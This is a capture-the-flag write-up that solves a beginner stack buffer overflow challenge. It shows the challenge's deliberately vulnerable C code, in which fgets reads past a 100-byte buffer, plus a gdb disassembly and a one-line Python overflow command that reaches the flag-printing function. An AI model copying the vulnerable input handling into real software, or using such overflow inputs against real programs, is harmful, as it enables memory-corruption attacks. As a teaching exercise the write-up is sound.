# Overwrite Me

* Challenge description : ```There's no way you can overwrite my checker variable, right?```

# given c code : 
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

//gcc -m32 -fno-stack-protector -no-pie chall.c -o chall

void init()
{
    setvbuf(stdin,NULL,_IONBF,0);
    setvbuf(stdout,NULL,_IONBF,0);
    setvbuf(stderr,NULL,_IONBF,0);
    alarm(60);
}

void win()
{
    char flag[50];
	FILE *f = fopen("flag","r");
	if(f == NULL){
		printf("No flag file. If you are running this on the server, contact the admins.");
		exit(0);
	}
	fgets(flag, 50, f);
	puts(flag);
}
 
int main()
{
    init();
    char buf[100];
    int value = 0;
    puts("Can you overwrite me? Enter your input!");
    fgets(buf, 108, stdin);
    if(value != 0)
    {
        puts("Good job! Here's your flag!");
        win();
    }
    else
    {
        puts("Sorry, better luck next time!");
    }
    return 0;
}
```
* From the above c code, we can infer that value initialized to 0, must be changed to anything other than 0 to meet the condition ```if(value!=0){ }```
* With this condition met, win() function is called and hene the flag gets printed.
* To overflow the value, we must take a look at the gdb dump : 

```
   0x080492b4 <+15>:	sub    esp,0x70
   0x080492b7 <+18>:	call   0x8049100 <__x86.get_pc_thunk.bx>
   0x080492bc <+23>:	add    ebx,0x2d44
   0x080492c2 <+29>:	call   0x80491c2 <init>
   0x080492c7 <+34>:	mov    DWORD PTR [ebp-0xc],0x0
   0x080492ce <+41>:	sub    esp,0xc
   0x080492d1 <+44>:	lea    eax,[ebx-0x1fa4]
   0x080492d7 <+50>:	push   eax
   0x080492d8 <+51>:	call   0x8049060 <puts@plt>
   0x080492dd <+56>:	add    esp,0x10
   0x080492e0 <+59>:	mov    eax,DWORD PTR [ebx-0x8]
   0x080492e6 <+65>:	mov    eax,DWORD PTR [eax]
   0x080492e8 <+67>:	sub    esp,0x4
   0x080492eb <+70>:	push   eax
   0x080492ec <+71>:	push   0x6c
   0x080492ee <+73>:	lea    eax,[ebp-0x70]
   0x080492f1 <+76>:	push   eax
   0x080492f2 <+77>:	call   0x8049040 <fgets@plt>
   0x080492f7 <+82>:	add    esp,0x10
   0x080492fa <+85>:	cmp    DWORD PTR [ebp-0xc],0x0
```
* from the above gdb dump, we see that a stack space of 0x70 bytes are intialized and value at ebp-0xc is compared with 0x0. (i.e the if condition) 
* so to overflow by the right amount, the input must be 0x70-0xc bytes long.

# Python Code : 
```
python -c "print('A'*100) " | ./Overwriteme.chall
```
